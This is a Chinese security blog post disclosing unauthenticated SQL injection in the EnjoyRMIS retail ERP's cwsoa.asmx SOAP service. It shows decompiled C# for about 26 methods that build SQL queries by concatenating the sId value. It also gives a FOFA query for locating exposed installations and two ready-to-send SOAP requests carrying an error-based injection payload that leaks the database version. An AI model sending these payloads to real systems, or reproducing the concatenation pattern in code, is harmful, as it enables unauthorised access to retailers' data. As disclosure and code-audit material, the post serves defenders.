---
title: "昂捷ERP cwsoa.asmx SQL注入漏洞"
source: https://mrxn.net/jswz/enjoyrmis-ws-pos-cwsoa-sId-sqli.html
asset_dir: assets/昂捷erp-cwsoa.asmx-sql注入漏洞
---

# 昂捷ERP cwsoa.asmx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/28 18:16
- 693浏览
- [0评论](#comment)
- 4小时阅读

深入探索

漏洞预警服务

恶意软件分析工具

网络安全会议

---

# 漏洞简介

EnjoyRMIS系统是由深圳市昂捷信息技术股份有限公司开发的一款面向零售行业的管理信息系统，旨在为超市、便利店、百货、购物中心及专营专卖等零售业态提供全面的数字化解决方案和服务。EnjoyRMIS系统的 /EnjoyRMIS\_WS/WS/POS/cwsoa.asmx 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息。

SQL注入检测工具

# fofa语法

> body="/Scripts/EnjoyMsg.js"

# 漏洞分析

## GetOAById

直接看 GetOAById 方法的实现

```
public DataSet GetOAById(string sId)
    {
      DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_a (nolock) where c_id = '{0}';\r\n\t\t\t\t\t\t\t\t\t\t  select a.*,b.c_name as c_name,c.c_name as c_provider_name from tb_o_ag a \r\n   \t\t\t\t\t\t\t\t\t\t    left join tb_gds b on a.c_gcode=b.c_gcode\r\n\t\t\t\t\t\t\t\t\t\t    left join tb_partner c on a.c_provider=c.c_no\r\n                                          where a.c_id='{0}'", (object) sId));
      dataSet.Tables[0].TableName = "tb_o_a";
      dataSet.Tables[1].TableName = "tb_o_ag";
      return dataSet;
    }
```

将 sId 直接拼接进SQL语句中组成SQL语句后代入 GetDataSet 方法执行，此方法在某些版本没有修复之前存在SQL注入漏洞的，修复后的版本增加了 CheckDangerSql 函数过滤

代码安全审计

```
public static string CheckDangerSql(string sInSql, bool bThrow)
    {
      if (sInSql == null || string.op_Equality(sInSql.Trim(), ""))
        return "";
      string strError = "";
      string sysCfg = CTools.GetSysCfg("系统配置", "系统参数", "检测危险SQL脚本的正则表达式", out strError);
      if (string.op_Equality(sysCfg, ""))
        return "";
      MatchCollection matchCollection = Regex.Matches(sInSql, sysCfg, (RegexOptions) 35);
      if (matchCollection.Count == 0)
        return "";
      StringBuilder stringBuilder = new StringBuilder("脚本含有危险的SQL语句：\r\n\r\n");
      foreach (Match match in matchCollection)
      {
        stringBuilder.Append(((Capture) match).Value);
        stringBuilder.Append("\r\n");
      }
      if (!bThrow)
        return stringBuilder.ToString();
      throw new Exception(stringBuilder.ToString());
    }
```

## GetOCashById

存在同样的拼接致SQL注入漏洞

漏洞修复方案

```
public DataSet GetOCashById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_cash (nolock) where c_id = '{0}';select * from tb_o_cashg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_cash";
  dataSet.Tables[1].TableName = "tb_o_cashg";
  return dataSet;
}
```

## GetOCgpById

```
public DataSet GetOCgpById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_cgp (nolock) where c_id = '{0}';select * from tb_o_cgpg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_cgp";
  dataSet.Tables[1].TableName = "tb_o_cgpg";
  return dataSet;
}
```

## GetOCountById

```
public DataSet GetOCountById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_count (nolock) where c_id = '{0}';select * from tb_o_countg (nolock)  where c_id = '{0}' order by c_gcode,c_subcode", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_count";
  dataSet.Tables[1].TableName = "tb_o_countg";
  return dataSet;
}
```

## GetOCpById

```
public DataSet GetOCpById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_cp (nolock) where c_id = '{0}';select * from tb_o_cpg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_cp";
  dataSet.Tables[1].TableName = "tb_o_cpg";
  return dataSet;
}
```

## GetODById

```
public DataSet GetODById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_d (nolock) where c_id = '{0}';select * from tb_o_dg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_d";
  dataSet.Tables[1].TableName = "tb_o_dg";
  return dataSet;
}
```

## GetOEmById

```
public DataSet GetOEmById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_em (nolock) where c_id = '{0}';select * from tb_o_emg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_em";
  dataSet.Tables[1].TableName = "tb_o_emg";
  return dataSet;
}
```

## GetOFById

```
public DataSet GetOFById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select a.*,b.c_name as c_store_name,c.c_name as c_provider_name,d.c_name as c_adname,\r\n\t\t\t\t\t\t\t\t\t\t\t\t e.c_name as c_mk_store_name,f.c_name as c_check_username,g.c_name as c_au_username,\r\n\t\t\t\t\t\t\t\t\t\t\t\t h.c_name as c_charge_username,i.c_name as c_mk_username\r\n\t\t\t\t\t\t\t\t\t\t\t\t from tb_o_f a \r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_store b on a.c_source_id=b.c_id\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_partner c on a.c_provider=c.c_no\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_depart d on a.c_adno=d.c_adno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_store e on a.c_mk_store_id=e.c_id\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user f on a.c_check_userno=f.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user g on a.c_au_userno=g.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user h on a.c_charge_userno=h.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user i on a.c_mk_userno=i.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t     where a.c_id= '{0}';\r\n\t\t\t\t\t\t\t\t\t\t         select a.*,b.c_name as c_name ,c.c_name as c_adname\r\n                                                 from tb_o_fg a left join tb_gds b on a.c_gcode=b.c_gcode\r\n                                                   left join tb_depart c on a.c_adno=c.c_adno \r\n                                                 where a.c_id='{0}'", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_f";
  dataSet.Tables[1].TableName = "tb_o_fg";
  return dataSet;
}
```

## GetOFByIdWithoutPre

```
public DataSet GetOFByIdWithoutPre(string sid)
    {
      string upper = sid.ToUpper();
      return new CDAOA().GetOFbyIdWithoutPre(!upper.StartsWith("F") ? sid : upper.Remove(0, 1));
    }

public DataSet GetOFbyIdWithoutPre(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("\r\ndeclare @isrecal varchar(10)\r\nSET @isrecal = dbo.uf_get_syscfg('系统参数', '进项税与销项税不一致时是否重算进价', '是')\r\n\r\nselect a.*,b.c_name as c_store_name,c.c_name as c_provider_name,d.c_name as c_adname,\r\n\t\t\t\t\t\t\t\t\t\t\t\t e.c_name as c_mk_store_name,f.c_name as c_check_username,g.c_name as c_au_username,\r\n\t\t\t\t\t\t\t\t\t\t\t\t h.c_name as c_charge_username,i.c_name as c_mk_username\r\n\t\t\t\t\t\t\t\t\t\t\t\t from tb_o_f a \r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_store b on a.c_source_id=b.c_id\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_partner c on a.c_provider=c.c_no\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_depart d on a.c_adno=d.c_adno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_store e on a.c_mk_store_id=e.c_id\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user f on a.c_check_userno=f.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user g on a.c_au_userno=g.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user h on a.c_charge_userno=h.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tleft join tb_user i on a.c_mk_userno=i.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\t     where a.c_id= '{0}';\r\n\t\t\t\t\t\t\t\t\t\t         select a.*,b.c_name as c_name ,c.c_name as c_adname,\r\n                                                        round((a.c_pt_in - a.c_pt_in0)*a.c_number,2) as c_at_cost,\r\n                                                        round((a.c_pt_in - a.c_pt_in0)*a.c_number/(1+a.c_tax_rate/100),2) as c_a_cost,case when @isrecal='是' then round((round(a.c_pt_in0/(1+a.c_tax_rate/100)*(1+a.c_tax_rate_pay/100),4)-a.c_pt_pay)*a.c_number*(-1),2)\r\n                                                       else round((round(a.c_pt_in0,4)-a.c_pt_pay)*a.c_number*(-1),2) end as c_at_pay\r\n                                                 from tb_o_fg a left join tb_gds b on a.c_gcode=b.c_gcode\r\n                                                   left join tb_depart c on a.c_adno=c.c_adno \r\n                                                 where a.c_id='{0}'", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_f";
  dataSet.Tables[1].TableName = "tb_o_fg";
  StringWriter stringWriter = new StringWriter(new StringBuilder());
  dataSet.WriteXml((TextWriter) stringWriter, (XmlWriteMode) 0);
  return dataSet;
}
```

## GetOFeeById

```
public DataSet GetOFeeById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select a.*,b.c_name as c_store_name,c.c_name as c_provider_name,d.c_name as c_adname,\r\n\t\t\t\t\t\t\t\t\t\t         e.c_name as c_mk_store_name,f.c_name as c_au_username,g.c_name as c_mk_username\r\n\t\t\t\t\t\t\t\t\t\t  from tb_o_fee a \r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_store b on a.c_store_id=b.c_id                   \r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_partner c on a.c_provider=c.c_no\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_depart d on a.c_adno=d.c_adno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_store e on a.c_mk_store_id=e.c_id\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user f on a.c_au_userno=f.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user g on a.c_mk_userno=g.c_userno\r\n\t\t\t\t\t\t\t\t\t\t  where a.c_id= '{0}';\r\n\t\t\t\t\t\t\t\t\t\t  select * from tb_o_feeg (nolock)  where c_id = '{0}'", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_fee";
  dataSet.Tables[1].TableName = "tb_o_feeg";
  return dataSet;
}
```

## GetOGById

```
public DataSet GetOGById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_g (nolock) where c_id = '{0}';select * from tb_o_gg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_g";
  dataSet.Tables[1].TableName = "tb_o_gg";
  return dataSet;
}
```

## GetOGroupById

```
public DataSet GetOGroupById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_group (nolock) where c_id = '{0}';select * from tb_o_groupg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_group";
  dataSet.Tables[1].TableName = "tb_o_groupg";
  return dataSet;
}
```

## GetOIById

```
public DataSet GetOIById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select a.*,\r\n\t\t\t\t\t\tb.c_name as c_adname,\r\n\t\t\t\t\t\tc.c_name as c_provider_name,\r\n\t\t\t\t\t\td.c_name as c_storename,\r\n\t\t\t\t\t\te.c_name as c_order_username,\r\n\t\t\t\t\t\tf.c_name as c_recname,\r\n\t\t\t\t\t\tg.c_name as c_auname,\r\n\t\t\t\t\t\th.c_name as c_mkname,\r\n                        i.c_name as c_delivery_store_name,\r\n                        j.c_name as c_charge_username,\r\n                        k.c_name as c_order_au_username,\r\n                        m.c_name as c_mk_username,\r\n                        n.c_name as c_mk_store_name,\r\n                        o.c_name as c_rec_username\r\n\r\n\t\t\t\t\t\tfrom tb_o_i a(nolock) left join tb_depart b(nolock) on a.c_adno=b.c_adno   \r\n\t\t\t\t\t\tleft join tb_partner c(nolock) on a.c_provider=c.c_no    \r\n\t\t\t\t\t\tleft join tb_store d(nolock) on a.c_rec_store_id=d.c_id  \r\n\t\t\t\t\t\tleft join tb_user e(nolock) on a.c_order_userno=e.c_userno  \r\n\t\t\t\t\t\tleft join tb_user f(nolock) on a.c_rec_userno=f.c_userno  \r\n\t\t\t\t\t\tleft join tb_user g(nolock) on a.c_rec_au_userno=g.c_userno  \r\n\t\t\t\t\t\tleft join tb_user h(nolock) on a.c_mk_usernor=h.c_userno  \r\n                        left join tb_store i(nolock) on a.c_delivery_store_id=i.c_id\r\n                        left join tb_user j(nolock) on a.c_charge_userno=j.c_userno\r\n                        left join tb_user k(nolock) on a.c_order_au_userno=k.c_userno\r\n                        left join tb_user m(nolock) on a.c_mk_usernoo=m.c_userno\r\n                        left join tb_store n(nolock) on a.c_mk_store_id=n.c_id\r\n                        left join tb_user o(nolock) on a.c_rec_userno=o.c_userno\r\n\r\n\t\t\t\t\t\twhere a.c_id = '{0}';\r\n\r\n\t\t\tselect distinct a.*,\r\n                    c.c_name as c_adname,\r\n\t\t\t\t\tb.c_name,\r\n\t\t\t\t\tb.c_subname,\r\n\t\t\t\t\tb.c_barcode,\r\n\t\t\t\t\tb.c_model,\r\n\t\t\t\t\ta.c_rec_n*a.c_pt_in as c_at_in,\r\n\t\t\t\t\t--a.c_rec_n*a.c_pt_in/(1+a.c_tax_rate/100) as c_a_in,\r\n                    a.c_aet_cost as c_a_in,\r\n\t\t\t\t\t--a.c_rec_n*a.c_pt_in-a.c_rec_n*a.c_pt_in/(1+a.c_tax_rate/100) as c_tax_in,\r\n                    a.c_rec_n*a.c_pt_in-a.c_aet_cost as c_tax_in,\r\n\t\t\t\t\ta.c_rec_n*a.c_pt_pay as c_at_pay,\r\n\t\t\t\t\t--a.c_rec_n*a.c_pt_pay-a.c_rec_n*a.c_pt_in/(1+a.c_tax_rate/100) as c_tax_pay,\r\n                    a.c_rec_n*a.c_pt_pay-a.c_aet_cost as c_tax_pay,\r\n\t\t\t\t\ta.c_rec_n*a.c_price as c_at_price,\r\n\t\t\t\t\ta.c_rec_n*a.c_price-a.c_rec_n*a.c_pt_in as c_profit,\r\n\t\t\t\t\tcase when a.c_rec_n*a.c_price>0 then (a.c_rec_n*a.c_price-a.c_rec_n*a.c_pt_in)/a.c_rec_n*a.c_price else 0 end  as c_profit_rate,\r\n\t\t\t\t\t--a.c_rec_n*a.c_price-(a.c_rec_n*a.c_pt_in/(1+a.c_tax_rate/100)) as c_price_in,\r\n                    a.c_rec_n*a.c_price-a.c_aet_cost as c_price_in,\r\n\t\t\t\t\ta.c_rec_n+c_rec_free_n as c_total_rec_n\r\n\r\n\t\t\tfrom tb_o_ig a(nolock) \r\n\t\t\tleft join tb_gds b(nolock) on a.c_gcode=b.c_gcode and a.c_subcode=b.c_subcode\r\n            left join tb_depart c(nolock) on a.c_adno=c.c_adno\r\n\t\t\twhere a.c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_i";
  dataSet.Tables[1].TableName = "tb_o_ig";
  return dataSet;
}
```

## GetOIDailyById

```
public DataSet GetOIDailyById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_i_daily (nolock) where c_id = '{0}';select * from tb_o_i_dailyg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_i_daily";
  dataSet.Tables[1].TableName = "tb_o_i_dailyg";
  return dataSet;
}
```

## GetOImById

```
public DataSet GetOImById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_im (nolock) where c_id = '{0}';select * from tb_o_img (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_im";
  dataSet.Tables[1].TableName = "tb_o_img";
  return dataSet;
}
```

## GetOIpById

```
public DataSet GetOIpById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_ip (nolock) where c_id = '{0}';select * from tb_o_ipg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_ip";
  dataSet.Tables[1].TableName = "tb_o_ipg";
  return dataSet;
}
```

## GetOLById

```
public DataSet GetOLById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select a.*,b.c_name as c_store_name,c.c_name as c_adname,d.c_name as c_apply_username,\r\n                                                e.c_name as c_charge_username,f.c_name as c_au_username,g.c_name as c_mk_username\r\n                                            from tb_o_l a(nolock) left join tb_store b(nolock) on a.c_store_id=b.c_id\r\n                                            left join tb_depart c(nolock) on a.c_adno=c.c_adno \r\n                                            left join tb_user d(nolock) on a.c_apply_userno=d.c_userno\r\n                                            left join tb_user e(nolock) on a.c_charge_userno=e.c_userno\r\n                                            left join tb_user f(nolock) on a.c_au_userno=f.c_userno\r\n                                            left join tb_user g(nolock) on a.c_mk_userno=g.c_userno\r\n                                            where a.c_id = '{0}';\r\n                                         select a.*,b.c_name as c_adname,c.c_name as c_name from tb_o_lg a(nolock) left join tb_depart b(nolock) on a.c_adno=b.c_adno \r\n                                            left join tb_gds c on a.c_gcode=c.c_gcode  \r\n                                           where a.c_id = '{0}' order by a.c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_l";
  dataSet.Tables[1].TableName = "tb_o_lg";
  return dataSet;
}
```

## GetOOmById

```
public DataSet GetOOmById(string sId)
    {
      DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_om (nolock) where c_id = '{0}';select * from tb_o_omg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
      dataSet.Tables[0].TableName = "tb_o_om";
      dataSet.Tables[1].TableName = "tb_o_omg";
      return dataSet;
    }
```

## GetOPById

```
public DataSet GetOPById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_p (nolock) where c_id = '{0}';select * from tb_o_pg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_p";
  dataSet.Tables[1].TableName = "tb_o_pg";
  return dataSet;
}
```

## GetOPayById

```
public DataSet GetOPayById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_pay (nolock) where c_id = '{0}';select * from tb_o_payg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_pay";
  dataSet.Tables[1].TableName = "tb_o_payg";
  return dataSet;
}
```

## GetOPresentById

```
public DataSet GetOPresentById(string sId)
    {
      DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_present (nolock) where c_id = '{0}';select * from tb_o_presentg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
      dataSet.Tables[0].TableName = "tb_o_present";
      dataSet.Tables[1].TableName = "tb_o_presentg";
      return dataSet;
    }
```

## GetOSpById

```
public DataSet GetOSpById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select a.*,b.c_name as c_provider_name,c.c_name as c_store_name,d.c_name as c_adname,\r\n\t\t\t\t\t\t\t\t\t\t\t\t e.c_name as c_check_username,f.c_name as c_account_username,g.c_name as c_mk_store_name,\r\n\t\t\t\t\t\t\t\t\t\t\t\t h.c_name as c_order_username,i.c_name as c_charge_username,j.c_name as c_au_username,\r\n\t\t\t\t\t\t\t\t\t\t\t\t k.c_name as c_mk_username\r\n\t\t\t\t\t\t\t\t\t\t  from tb_o_sp a \r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_partner b on a.c_provider=b.c_no\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_store c on a.c_store_id=c.c_id\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_depart d on a.c_adno=d.c_adno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user e on a.c_check_userno=e.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user f on a.c_account_userno=f.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_store g on a.c_mk_store_id=g.c_id\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user h on a.c_order_userno=h.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user i on a.c_charge_userno=i.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user j on a.c_au_userno=j.c_userno\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_user k on a.c_mk_userno=k.c_userno\r\n\t\t\t\t\t                      where a.c_id='{0}';\r\n\t\t\t\t\t\t\t\t\t\t  select a.*,b.c_name as c_name ,c.c_name as c_store_name\r\n\t\t\t\t\t\t\t\t\t\t  from tb_o_spg a \r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_gds b on a.c_gcode=b.c_gcode\r\n\t\t\t\t\t\t\t\t\t\t\tleft join tb_store c on a.c_store_id=c.c_id\r\n\t\t\t\t\t                      where a.c_id= '{0}'", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_sp";
  dataSet.Tables[1].TableName = "tb_o_spg";
  return dataSet;
}
```

## GetOTakeById

```
public DataSet GetOTakeById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_take (nolock) where c_id = '{0}';select * from tb_o_takeg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_take";
  dataSet.Tables[1].TableName = "tb_o_takeg";
  return dataSet;
}
```

## GetOTollById

```
public DataSet GetOTollById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select * from tb_o_toll (nolock) where c_id = '{0}';select * from tb_o_tollg (nolock)  where c_id = '{0}' order by c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_toll";
  dataSet.Tables[1].TableName = "tb_o_tollg";
  return dataSet;
}
```

## GetOUById

```
public DataSet GetOUById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select a.*,b.c_name as c_store_name,c.c_name as c_adname,d.c_name as c_use_adname,\r\n                                            e.c_name as c_charge_username,f.c_name as c_au_username,g.c_name as c_mk_username\r\n                                            from tb_o_u a(nolock) left join tb_store b(nolock) on a.c_store_id=b.c_id\r\n                                            left join tb_depart c(nolock) on a.c_adno=c.c_adno\r\n                                            left join tb_depart d(nolock) on a.c_use_adno=d.c_adno\r\n                                            left join tb_user e(nolock) on a.c_charge_userno=e.c_userno\r\n                                            left join tb_user f(nolock) on a.c_au_userno=f.c_userno\r\n                                            left join tb_user g(nolock) on a.c_mk_userno=g.c_userno\r\n                                            where a.c_id = '{0}';\r\n                                          select a.*,b.c_name as c_name,c.c_name as c_adname\r\n                                            from tb_o_ug a(nolock) left join tb_gds b(nolock) on a.c_gcode=b.c_gcode \r\n                                            left join tb_depart c(nolock) on a.c_adno=c.c_adno\r\n                                            where a.c_id = '{0}' order by a.c_sort", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_u";
  dataSet.Tables[1].TableName = "tb_o_ug";
  return dataSet;
}
```

## GetOWById

```
public DataSet GetOWById(string sId)
{
  DataSet dataSet = new CDACommon().GetDataSet(string.Format("select a.*,b.c_name as c_adno_name, c.c_name as c_store_name ,d.c_name as c_client_name,e.c_name as c_mk_username,f.c_name as c_au_username,g.c_name as c_charge_username\r\n                                            from tb_o_w as a\r\n\t                                            left join tb_depart b on a.c_adno=b.c_adno \r\n\t                                            left join tb_store c on a.c_store_id=c.c_id\r\n\t                                            left join tb_custinfo d on a.c_client=d.c_no\r\n\t                                            left join tb_user e on a.c_mk_userno=e.c_userno\r\n\t                                            left join tb_user f on a.c_au_userno=f.c_userno\r\n\t                                            left join tb_user g on a.c_charge_userno=g.c_userno\r\n                                            where a.c_id= '{0}';\r\n\r\n                                            select a.*,b.c_name as c_gname,c.c_name as c_adname ,b.c_barcode,b.c_model,b.c_No\r\n                                            from tb_o_wg a\r\n\t                                            left join tb_gds  b on a.c_gcode=b.c_gcode \r\n\t                                            left join tb_depart c on a.c_adno=c.c_adno     \r\n                                            where a.c_id= '{0}';", (object) sId));
  dataSet.Tables[0].TableName = "tb_o_w";
  dataSet.Tables[1].TableName = "tb_o_wg";
  return dataSet;
}
```

# 漏洞复现

## GetOAById

```
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
SOAPAction: http://tempuri.org/GetOAById
Content-Type: text/xml;charset=UTF-8
Host: enjoyrmis.mrxn.net

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetOAById>
         <!--type: string-->
         <tem:sId>'and 1=@@version--</tem:sId>
      </tem:GetOAById>
   </soap:Body>
</soap:Envelope>
```

[![昂捷ERP cwsoa.asmx SQL注入漏洞](images/img-001-becd8aa0b79e.webp)](https://image.mrxn.net/ea35e130eb7747b0aa5861a783f44fc9.webp)

成功利用报错注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取到数据库版本信息。

网络安全

## GetOCashById

```
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
SOAPAction: http://tempuri.org/GetOCashById
Content-Type: text/xml;charset=UTF-8
Host: enjoyrmis.mrxn.net

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetOCashById>
         <!--type: string-->
         <tem:sId>'and 1=@@version--</tem:sId>
      </tem:GetOCashById>
   </soap:Body>
</soap:Envelope>
```

[![昂捷ERP cwsoa.asmx SQL注入漏洞](images/img-002-1e8d3711231c.webp)](https://image.mrxn.net/328dcc0c3e354fe4b33f7bb8194e6161.webp)

其余的如 GetOCgpById、GetOCgpById、GetOCountById、GetOCpById、GetODById、GetOEmById、GetOFById、GetOFByIdWithoutPre、GetOFeeById、GetOGById、GetOGroupById、GetOIById、GetOIDailyById、GetOImById、GetOIpById、GetOLById、GetOOmById、GetOPById、GetOPayById、GetOPresentById、GetOSpById、GetOTakeById、GetOTollById、GetOUById、GetOWById 等同样如此复现即可。

编程

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [3.1.GetOAById](#toc-3-1-)
- [3.2.GetOCashById](#toc-3-2-)
- [3.3.GetOCgpById](#toc-3-3-)
- [3.4.GetOCountById](#toc-3-4-)
- [3.5.GetOCpById](#toc-3-5-)
- [3.6.GetODById](#toc-3-6-)
- [3.7.GetOEmById](#toc-3-7-)
- [3.8.GetOFById](#toc-3-8-)
- [3.9.GetOFByIdWithoutPre](#toc-3-9-)
- [3.10.GetOFeeById](#toc-3-10-)
- [3.11.GetOGById](#toc-3-11-)
- [3.12.GetOGroupById](#toc-3-12-)
- [3.13.GetOIById](#toc-3-13-)
- [3.14.GetOIDailyById](#toc-3-14-)
- [3.15.GetOImById](#toc-3-15-)
- [3.16.GetOIpById](#toc-3-16-)
- [3.17.GetOLById](#toc-3-17-)
- [3.18.GetOOmById](#toc-3-18-)
- [3.19.GetOPById](#toc-3-19-)
- [3.20.GetOPayById](#toc-3-20-)
- [3.21.GetOPresentById](#toc-3-21-)
- [3.22.GetOSpById](#toc-3-22-)
- [3.23.GetOTakeById](#toc-3-23-)
- [3.24.GetOTollById](#toc-3-24-)
- [3.25.GetOUById](#toc-3-25-)
- [3.26.GetOWById](#toc-3-26-)
- [4.漏洞复现](#toc-4-)
- [4.1.GetOAById](#toc-4-1-)
- [4.2.GetOCashById](#toc-4-2-)

  
  

